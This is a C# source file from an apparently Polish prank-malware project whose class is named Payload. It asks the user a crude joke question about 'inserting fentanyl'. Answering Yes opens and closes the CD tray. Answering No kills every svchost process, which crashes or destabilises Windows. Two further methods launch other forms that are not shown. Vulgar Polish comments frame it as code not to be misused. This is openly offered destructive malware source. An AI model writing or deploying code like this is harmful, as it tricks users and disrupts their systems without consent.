using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using System.Runtime.InteropServices;

// Nie zapierdalac ani uzywac w celach zjebanych
namespace Floydziak4
{
    public class Payload
    {
        [DllImport("winmm.dll", EntryPoint = "mciSendString")]
        public static extern int mciSendString(string lpstrCommand, string lpstrReturnString, int uRetrunLenght, int hwndCallback);

        public void InsertKremowka()
        {
            DialogResult dialog = MessageBox.Show("Chcesz wsadzic fentanyl?", "Wsadz fentanyl", MessageBoxButtons.YesNo);
            if(dialog == DialogResult.Yes)
            {
                try
                {
                    int result = mciSendString("set cdaudio door open", null, 0, 0);
                    Thread.Sleep(2137);
                    result = mciSendString("set cdaudio door close", null, 0, 0);
                }
                catch (Exception e)
                {
                    int result = mciSendString("set cdaudio door open", null, 0, 0);
                    Thread.Sleep(2137);
                    result = mciSendString("set cdaudio door close", null, 0, 0);
                }

                
            }
            else
            {
                Process[] processes = Process.GetProcessesByName("svchost");
                foreach (var proc in processes) 
                {
                    proc.Kill();
                }
            }
        }
        public void payload1()
        {
            Thread thread = new Thread(() =>
            {
                Application.Run(new Form2());
            });
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
        }
        public void payload2() 
        {
            Thread thread = new Thread(() =>
            {
                Application.Run(new Form3());
            });
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
        }

        
    }
}
// Nie zapierdalac ani uzywac w celach zjebanych